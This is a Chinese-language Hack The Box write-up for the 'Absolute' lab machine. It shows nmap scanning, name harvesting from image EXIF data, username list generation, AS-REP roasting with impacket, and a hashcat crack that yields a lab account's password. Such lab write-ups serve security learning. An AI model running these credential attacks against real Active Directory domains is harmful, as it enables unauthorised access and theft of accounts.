---
title: HTB-Absolute Writeup
date: 2026-08-05T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - AS-REP-Roasting
  - SMB
  - LDAP
  - GetNPUsers
  - getTGT
  - dacledit
  - Shadow_Credentials
---
## Nmap 探索

使用 Nmap 扫描端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ sudo nmap --min-rate 10000 -p- 10.129.232.60 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-13 22:07 -0400
Warning: 10.129.232.60 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.232.60
Host is up (0.63s latency).
Not shown: 56752 closed tcp ports (reset), 8757 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49698/tcp open  unknown
49701/tcp open  unknown
49720/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 79.93 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49679,49698,49701,49720
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49679,49698,49701,49720 10.129.232.60 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-13 22:12 -0400
Nmap scan report for 10.129.232.60
Host is up (0.074s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-14 09:12:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-09-14T09:13:19+00:00; +6h59m14s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-14T09:13:19+00:00; +6h59m15s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-09-14T09:13:19+00:00; +6h59m15s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2026-05-26T20:10:43
|_Not valid after:  2043-07-17T21:20:54
|_ssl-date: 2026-09-14T09:13:19+00:00; +6h59m15s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m14s, deviation: 0s, median: 6h59m14s
| smb2-time:
|   date: 2026-09-14T09:13:10
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.79 seconds
```

将暴露出来的域名解析至 hosts 。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ sudo bash -c 'echo "10.129.232.60 absolute.htb dc.absolute.htb" >> /etc/hosts'
[sudo] password for kali:
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ tail -n 1 /etc/hosts
10.129.232.60 absolute.htb dc.absolute.htb
```

看扫描结果，靶机为 `Windows Server 2019`，开放了 `53`、`80`、`88`、`389`、`445`、`5985` 等端口，是一台域控制器，域名为 `absolute.htb`，同时暴露了 `dc.absolute.htb`。

## SMB 探索

用 nxc 尝试枚举共享文件夹失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nxc smb 10.129.232.60 -u '' -p '' --shares
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.60   445    DC               [+] absolute.htb\:
SMB         10.129.232.60   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

## LDAP 探索

尝试匿名提取 LDAP，匿名长训不可用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ ldapsearch -x -H ldap://absolute.htb  -b "DC=absolute,DC=htb" '(objectClass=user)' sAMAccountName
# extended LDIF
#
# LDAPv3
# base <DC=absolute,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## Web 渗透

访问 80 端口，发现很多图片，查看图片格式发现类似 `hero_{1..6}.jpg`，使用 wget 全部下载到本地。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Images]
└─$ wget -q http://absolute.htb/images/hero_{1..6}.jpg -P imgs

┌──(kali㉿kali)-[~/…/Kali/Absoult/Images/imgs]
└─$ ls
hero_1.jpg  hero_2.jpg  hero_3.jpg  hero_4.jpg  hero_5.jpg  hero_6.jpg
```

用 exiftool 查询图片元数据，发现作者名。

```bash
┌──(kali㉿kali)-[~/…/Kali/Absolute/Images/imgs]
└─$ exiftool *.jpg
======== hero_1.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 15:45:20-04:00
File Access Date/Time           : 2026:09:14 01:45:14-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:14-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
======== hero_2.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_2.jpg
Directory                       : .
File Size                       : 374 kB
File Modification Date/Time     : 2022:06:07 15:57:42-04:00
File Access Date/Time           : 2026:09:14 01:45:15-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:15-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : Michael Chaffrey
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : D96BDD92B5AA2296D431558F292FEFF2
Derived From Instance ID        : D96BDD92B5AA2296D431558F292FEFF2
Document ID                     : xmp.did:90080B67048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:90080B66048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
======== hero_3.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_3.jpg
Directory                       : .
File Size                       : 381 kB
File Modification Date/Time     : 2022:06:07 15:57:46-04:00
File Access Date/Time           : 2026:09:14 01:45:16-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:16-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : Donald Klay
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : A4E8D5EA6B0FDC16C152F927E6EA3153
Derived From Instance ID        : A4E8D5EA6B0FDC16C152F927E6EA3153
Document ID                     : xmp.did:90080B6B048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:90080B6A048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
======== hero_4.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_4.jpg
Directory                       : .
File Size                       : 2.1 MB
File Modification Date/Time     : 2022:06:07 15:58:02-04:00
File Access Date/Time           : 2026:09:14 01:45:20-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:20-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : Sarah Osvald
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 3453
Image Height                    : 5180
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3453x5180
Megapixels                      : 17.9
======== hero_5.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_5.jpg
Directory                       : .
File Size                       : 1835 kB
File Modification Date/Time     : 2022:06:07 15:58:08-04:00
File Access Date/Time           : 2026:09:14 01:45:25-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:25-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : Jeffer Robinson
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 3096
Image Height                    : 4128
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3096x4128
Megapixels                      : 12.8
======== hero_6.jpg
ExifTool Version Number         : 13.50
File Name                       : hero_6.jpg
Directory                       : .
File Size                       : 5.5 MB
File Modification Date/Time     : 2022:06:07 15:58:32-04:00
File Access Date/Time           : 2026:09:14 01:45:37-04:00
File Inode Change Date/Time     : 2026:09:14 01:45:37-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : Nicole Smith
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 2961
Image Height                    : 4451
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2961x4451
Megapixels                      : 13.2
    6 image files read
```

将这几个人名保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ cat Users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

根据域环境常见的命名规则拓展字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ awk '{f=tolower($1); l=tolower($2); print f"."l; print substr(f,1,1)"."l; print f l; print substr(f,1,1) l; print f"_"l}' Users
james.roberts
j.roberts
jamesroberts
jroberts
james_roberts
michael.chaffrey
m.chaffrey
michaelchaffrey
mchaffrey
michael_chaffrey
donald.klay
d.klay
donaldklay
dklay
donald_klay
sarah.osvald
s.osvald
sarahosvald
sosvald
sarah_osvald
jeffer.robinson
j.robinson
jefferrobinson
jrobinson
jeffer_robinson
nicole.smith
n.smith
nicolesmith
nsmith
nicole_smith
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ cat Users.txt
d.klay
dklay
donald.klay
donald_klay
donaldklay
james.roberts
james_roberts
jamesroberts
jeffer.robinson
jeffer_robinson
jefferrobinson
j.roberts
jroberts
j.robinson
jrobinson
m.chaffrey
mchaffrey
michael.chaffrey
michael_chaffrey
michaelchaffrey
nicole.smith
nicole_smith
nicolesmith
n.smith
nsmith
sarah.osvald
sarah_osvald
sarahosvald
s.osvald
sosvald
```

## AS-REP Roasting

用 GetNPUsers 探测不需要预认证的用户。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ impacket-GetNPUsers absolute.htb/ -usersfile Users.txt -no-pass -dc-ip 10.129.232.60
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$d.klay@ABSOLUTE.HTB:93152204290161be68df288968bc479c$2d1de643794230c43e2c8196ec74ba26b4e813efd82fb717f736031f430dbaab562fbc784ae8f060433169679df30f482c30e5651e4bebec14daff824e9b7bdc821afeeac65b8fc5d52c5a20ac56675a8a2e542d7cec218721eca57e6cbb8bb0469051322968b93ec817a9c52bff59746a5945bc1697a4a68af96cd634fa20ea48fb6e8b65a4339d437146792412a276ea0984056736f497b60997723520a82af49113d38da97cc3c7cbcd811216c4b9307119453490a2f7db2c9144022166cd50d266d124dab8974b17701308c098ff16cbc8cd0ceb84eeb539db74a1d601982405467f28f2030a92dcbc89
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

发现 d.klay 不需要预认证，拿到 AS-REP 哈希。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ vim d.klay_hash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ cat d.klay_hash
$krb5asrep$23$d.klay@ABSOLUTE.HTB:93152204290161be68df288968bc479c$2d1de643794230c43e2c8196ec74ba26b4e813efd82fb717f736031f430dbaab562fbc784ae8f060433169679df30f482c30e5651e4bebec14daff824e9b7bdc821afeeac65b8fc5d52c5a20ac56675a8a2e542d7cec218721eca57e6cbb8bb0469051322968b93ec817a9c52bff59746a5945bc1697a4a68af96cd634fa20ea48fb6e8b65a4339d437146792412a276ea0984056736f497b60997723520a82af49113d38da97cc3c7cbcd811216c4b9307119453490a2f7db2c9144022166cd50d266d124dab8974b17701308c098ff16cbc8cd0ceb84eeb539db74a1d601982405467f28f2030a92dcbc89
```

将 hash 保存下来，用 hashcat 破解。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo hashcat -m 18200 d.klay_hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27105 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$d.klay@ABSOLUTE.HTB:93152204290161be68df288968bc479c$2d1de643794230c43e2c8196ec74ba26b4e813efd82fb717f736031f430dbaab562fbc784ae8f060433169679df30f482c30e5651e4bebec14daff824e9b7bdc821afeeac65b8fc5d52c5a20ac56675a8a2e542d7cec218721eca57e6cbb8bb0469051322968b93ec817a9c52bff59746a5945bc1697a4a68af96cd634fa20ea48fb6e8b65a4339d437146792412a276ea0984056736f497b60997723520a82af49113d38da97cc3c7cbcd811216c4b9307119453490a2f7db2c9144022166cd50d266d124dab8974b17701308c098ff16cbc8cd0ceb84eeb539db74a1d601982405467f28f2030a92dcbc89:Darkmoonsky248girl

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$d.klay@ABSOLUTE.HTB:93152204290161be6...dcbc89
Time.Started.....: Mon Sep 14 02:20:20 2026 (3 secs)
Time.Estimated...: Mon Sep 14 02:20:23 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3275.8 kH/s (1.45ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11239424/14344385 (78.35%)
Rejected.........: 0/11239424 (0.00%)
Restore.Point....: 11231232/14344385 (78.30%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Devanique -> Daniel240207
Hardware.Mon.#01.: Util: 57%

Started: Mon Sep 14 02:20:09 2026
Stopped: Mon Sep 14 02:20:24 2026
```

得到 d.klay 的密码是 Darkmoonsky248girl，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ cat d.klay
d.klay:Darkmoonsky248girl
```

